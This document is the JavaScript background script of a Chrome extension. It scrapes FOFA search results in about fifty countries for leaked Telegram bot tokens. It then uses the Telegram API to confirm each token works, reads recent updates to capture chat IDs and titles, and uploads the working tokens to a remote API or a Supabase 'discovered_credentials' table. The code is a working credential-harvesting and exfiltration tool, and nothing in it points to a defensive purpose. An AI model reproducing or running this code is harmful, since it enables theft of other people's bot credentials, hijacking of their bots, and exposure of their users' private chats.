// --- CONFIGURATION ---
const BASE_QUERY_TEMPLATE = 'body="api.telegram.org/bot"'; // Narrowed to /bot path to reduce documentation page false positives
const COUNTRY_CODES = [
    "US", "CN", "HK", "RU", "FR", "DE", "NL", "SG", "GB", "JP",
    "KR", "IN", "BR", "CA", "AU", "IT", "ES", "TR", "UA", "VN",
    "ID", "PL", "SE", "CH", "NO", "FI", "DK", "IE", "AT", "CZ",
    "RO", "ZA", "MX", "AR", "CO", "CL", "MY", "TH", "PH", "PK",
    "IR", "SA", "AE", "IL", "GR", "PT", "BE", "HU", "NZ"
];

// --- STATE ---
let state = {
    isRunning: false,
    isPaused: false,
    status: "Ready",
    query: BASE_QUERY_TEMPLATE,
    domain: "en.fofa.info",
    countryIndex: 0,
    countriesDone: 0,
    resultsFound: 0,
    resultsValid: 0,
    results: [],
    seenTokens: new Set()
};

loadState();

let activeTabId = null;

// --- LISTENERS ---
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    switch (msg.action) {
        case "GET_STATE":
            sendResponse(serializeState(state));
            return false;
        case "START_SCAN":
            startScan(msg.query, msg.domain);
            break;
        case "STOP_SCAN":
            stopScan("Stopped by user");
            break;
        case "RESUME_SCAN":
            resumeScan();
            break;
        case "UPLOAD_RESULTS":
            uploadToSupabase();
            break;
        case "CAPTCHA_DETECTED":
            pauseScan("⚠️ Captcha Detected!");
            break;
        case "RESULT_FOUND":
            handleResult(msg.data);
            break;
        case "PAGE_COMPLETE":
            nextCountry();
            break;
        case "LOG":
            console.log("[Content]", msg.message);
            break;
    }
    return false;
});

// --- PERSISTENCE ---

function saveState() {
    const storageState = { ...state, seenTokens: Array.from(state.seenTokens) };
    chrome.storage.local.set({ scraper_state: storageState });
}

function loadState() {
    chrome.storage.local.get(["scraper_state"], (result) => {
        if (result.scraper_state) {
            const loaded = result.scraper_state;
            loaded.seenTokens = loaded.seenTokens ? new Set(loaded.seenTokens) : new Set();
            if (loaded.isRunning && !loaded.isPaused) {
                loaded.isRunning = false;
                loaded.status = "Stopped (Recovered)";
            }
            state = loaded;
        }
    });
}

function serializeState(s) {
    return s;
}

// --- CORE LOGIC ---

async function startScan(userQuery, userDomain) {
    if (state.isRunning) return;

    state.isRunning = true;
    state.isPaused = false;
    state.status = "Starting...";
    state.query = userQuery || BASE_QUERY_TEMPLATE;
    state.domain = userDomain || "en.fofa.info";
    state.countryIndex = 0;
    state.countriesDone = 0;
    state.resultsFound = 0;
    state.resultsValid = 0;
    state.results = [];
    state.seenTokens = new Set();
    state.countryList = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);

    saveState();

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) { stopScan("No active tab found"); return; }
    activeTabId = tab.id;

    // Watchdog: fires every 2 minutes to unstick a stalled scan
    chrome.alarms.create("watchdog", { periodInMinutes: 2 });

    broadcastState();
    processNextCountry();
}

function stopScan(reason) {
    state.isRunning = false;
    state.isPaused = false;
    state.status = reason || "Stopped";
    chrome.alarms.clearAll();
    // Tell the content script to abort immediately
    if (activeTabId) {
        chrome.tabs.sendMessage(activeTabId, { action: "STOP_WORK" }).catch(() => {});
    }
    saveState();
    broadcastState();
}

function pauseScan(reason) {
    state.isPaused = true;
    state.status = reason || "Paused";
    saveState();
    broadcastState();
}

function resumeScan() {
    if (!state.isRunning && state.status !== "Stopped (Recovered)") return;
    if (!state.isRunning) state.isRunning = true;
    state.isPaused = false;
    state.status = "Resuming...";
    saveState();
    broadcastState();

    chrome.tabs.query({ active: true, currentWindow: true }).then(([tab]) => {
        if (tab) {
            activeTabId = tab.id;
            chrome.tabs.sendMessage(activeTabId, { action: "RESUME_WORK" }).catch(() => {
                processNextCountry(false);
            });
        } else {
            stopScan("Could not find active tab to resume");
        }
    });
}

function nextCountry() {
    state.countryIndex++;
    state.countriesDone++;
    saveState();
    processNextCountry();
}

async function processNextCountry(increment = true) {
    if (!state.isRunning || state.isPaused) return;

    const currentList = state.countryList || COUNTRY_CODES;

    if (state.countryIndex >= currentList.length) {
        stopScan("✅ Scan Complete!");
        await uploadToSupabase();
        return;
    }

    const country = currentList[state.countryIndex];
    state.status = `Navigating: ${country} (${state.domain})`;
    saveState();
    broadcastState();

    const fullQuery = `${state.query} && country="${country}"`;
    const encoded = btoa(fullQuery);
    const targetUrl = `https://${state.domain}/result?qbase64=${encoded}`;

    await chrome.tabs.update(activeTabId, { url: targetUrl });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tabId === activeTabId && changeInfo.status === "complete" && state.isRunning && !state.isPaused) {
        // Use chrome.alarms to schedule the scrape message — alarms wake the service worker
        // reliably even if it went to sleep during the 2s wait.
        chrome.alarms.create("scrape_page", { delayInMinutes: 0.05 }); // ~3 seconds
    }
});

// Alarm handler — wakes the service worker and sends the scrape message
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "scrape_page") {
        if (!state.isRunning || state.isPaused || !activeTabId) return;
        chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch((err) => {
            console.log("SCRAPE_PAGE send failed:", err);
            // Tab may have navigated away or content script not ready — move on
            nextCountry();
        });
    }

    if (alarm.name === "watchdog") {
        // If scan is running but appears stuck (no country progress), nudge it
        if (state.isRunning && !state.isPaused && activeTabId) {
            chrome.tabs.get(activeTabId, (tab) => {
                if (chrome.runtime.lastError || !tab) {
                    stopScan("Tab closed — scan stopped");
                    return;
                }
                // Tab exists — if it's done loading and we haven't moved, re-trigger
                if (tab.status === "complete") {
                    chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch(() => {
                        nextCountry();
                    });
                }
            });
        }
    }
});

// --- VALIDATION ---

async function validateToken(data) {
    const token = data.token;
    const baseUrl = `https://api.telegram.org/bot${token}`;

    try {
        const meRes = await fetch(`${baseUrl}/getMe`);
        const meJson = await meRes.json();

        if (!meJson.ok) {
            data.valid = false;
            data.status = "Invalid/Revoked";
            return data;
        }

        data.valid = true;
        data.bot_name = meJson.result.username;
        data.bot_id = meJson.result.id;

        if (!data.chatId) {
            try {
                const upRes = await fetch(`${baseUrl}/getUpdates?limit=5`);
                const upJson = await upRes.json();
                if (upJson.ok && upJson.result) {
                    for (const update of upJson.result) {
                        const message = update.message || update.channel_post || update.my_chat_member;
                        if (message && message.chat) {
                            data.chatId = message.chat.id;
                            data.chatType = message.chat.type;
                            data.chatTitle = message.chat.title || message.chat.username;
                            break;
                        }
                    }
                }
            } catch (_) {}
        }

        return data;
    } catch (_) {
        data.valid = false;
        data.status = "Network/Error";
        return data;
    }
}

async function handleResult(data) {
    if (!state.isRunning && state.status !== "Paused") return;
    if (state.seenTokens.has(data.token)) return;
    state.seenTokens.add(data.token);

    const validatedData = await validateToken(data);
    console.log("🦅 FOUND CREDENTIAL:", validatedData);

    state.results.push(validatedData);
    state.resultsFound++;
    if (validatedData.valid) state.resultsValid++;

    saveState();
    broadcastState();
}

function broadcastState() {
    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: state }).catch(() => {});
}

// --- SUPABASE DIRECT UPLOAD ---
// Credentials are stored in chrome.storage.sync (syncs across Chrome profiles).
// If an API URL is configured, uploads route through the backend /ingest endpoint
// for server-side Fernet encryption. Falls back to direct Supabase write otherwise.

function sha256hex(str) {
    // Encode string to Uint8Array, hash with SubtleCrypto, return hex string
    const encoder = new TextEncoder();
    return crypto.subtle.digest("SHA-256", encoder.encode(str)).then((buf) => {
        return Array.from(new Uint8Array(buf))
            .map((b) => b.toString(16).padStart(2, "0"))
            .join("");
    });
}

async function uploadToSupabase() {
    const validResults = (state.results || []).filter((r) => r.valid === true);
    if (validResults.length === 0) {
        state.status = "⚠️ Nothing to upload (no valid tokens)";
        saveState();
        broadcastState();
        return;
    }

    const cfg = await new Promise((resolve) => {
        chrome.storage.sync.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
    });

    const apiUrl         = (cfg.apiUrl         || "").trim().replace(/\/+$/, "");
    const supabaseUrl    = (cfg.supabaseUrl     || "").trim().replace(/\/+$/, "");
    const supabaseKey    = (cfg.supabaseKey     || "").trim();
    const extensionSecret = (cfg.extensionSecret || "").trim();

    // --- Route 1: API endpoint (preferred — server-side Fernet encryption) ---
    if (apiUrl) {
        state.status = `⬆️ Uploading ${validResults.length} tokens via API...`;
        saveState();
        broadcastState();

        const payload = {
            source: "extension",
            domain: state.domain,
            query: state.query,
            results: validResults.map((r) => ({
                token:        r.token,
                chat_id:      r.chatId   || null,
                chat_name:    r.chatTitle || null,
                chat_type:    r.chatType  || null,
                bot_id:       r.bot_id    ? String(r.bot_id) : null,
                bot_username: r.bot_name  || r.botUsername   || null,
                valid:        r.valid,
                meta:         { domain: state.domain, query: state.query },
            })),
        };

        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 15000);
            const res = await fetch(`${apiUrl}/ingest/extension/credentials`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
                signal: controller.signal,
            });
            clearTimeout(timeout);

            if (res.ok) {
                const data = await res.json().catch(() => ({}));
                state.status = `✅ API Upload: ${data.inserted || 0} inserted, ${data.updated || 0} updated, ${data.skipped || 0} skipped`;
            } else {
                const text = await res.text().catch(() => "");
                console.warn(`API upload failed: ${res.status} ${text}`);
                state.status = `⚠️ API upload failed (${res.status}) — falling back to direct write`;
                // Fall through to direct Supabase write
                await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
                return;
            }
        } catch (e) {
            console.warn("API upload exception:", e);
            state.status = `⚠️ API unreachable — falling back to direct write`;
            await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
            return;
        }

        saveState();
        broadcastState();
        return;
    }

    // --- Route 2: Direct Supabase write (fallback — raw token, self-healed by backend) ---
    if (!supabaseUrl || !supabaseKey || !extensionSecret) {
        state.status = "⚠️ Upload skipped — set API URL or Supabase credentials in settings";
        saveState();
        broadcastState();
        return;
    }

    await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
}

async function _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults) {
    state.status = `⬆️ Uploading ${validResults.length} tokens directly to Supabase...`;
    saveState();
    broadcastState();

    const endpoint = `${supabaseUrl}/rest/v1/discovered_credentials`;
    const headers = {
        "Content-Type": "application/json",
        "apikey": supabaseKey,
        "Authorization": `Bearer ${supabaseKey}`,
        // Secret checked by RLS policy — without this, the insert is rejected at DB level
        "x-extension-secret": extensionSecret,
        "Prefer": "resolution=merge-duplicates,return=representation"
    };

    let inserted = 0;
    let skipped = 0;

    for (const r of validResults) {
        const token = (r.token || "").trim();
        if (!token || !token.includes(":")) { skipped++; continue; }

        const tokenHash = await sha256hex(token);

        const row = {
            // Raw token — the backend worker detects non-Fernet values and
            // self-heals by encrypting in place before processing (see flow_tasks.py).
            bot_token: token,
            token_hash: tokenHash,
            source: "extension_fofa",
            status: r.chatId ? "active" : "pending",
            bot_id: r.bot_id ? String(r.bot_id) : null,
            bot_username: r.bot_name || r.botUsername || null,
            chat_id: r.chatId || null,
            chat_name: r.chatTitle || null,
            chat_type: r.chatType || null,
            meta: {
                ingested_via: "extension",
                domain: state.domain,
                query: state.query,
                valid: r.valid
            }
        };

        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 10000);

            const res = await fetch(endpoint, {
                method: "POST",
                headers,
                body: JSON.stringify(row),
                signal: controller.signal
            });
            clearTimeout(timeout);

            if (res.ok || res.status === 409) {
                // 409 = conflict on token_hash unique constraint (already exists) — not an error
                inserted++;
            } else {
                const text = await res.text().catch(() => "");
                console.warn(`Upload failed for token ${token.slice(0, 10)}...: ${res.status} ${text}`);
                skipped++;
            }
        } catch (e) {
            console.warn("Upload exception:", e);
            skipped++;
        }
    }

    state.status = `✅ Direct Upload: ${inserted} tokens (${skipped} skipped)`;
    saveState();
    broadcastState();
}
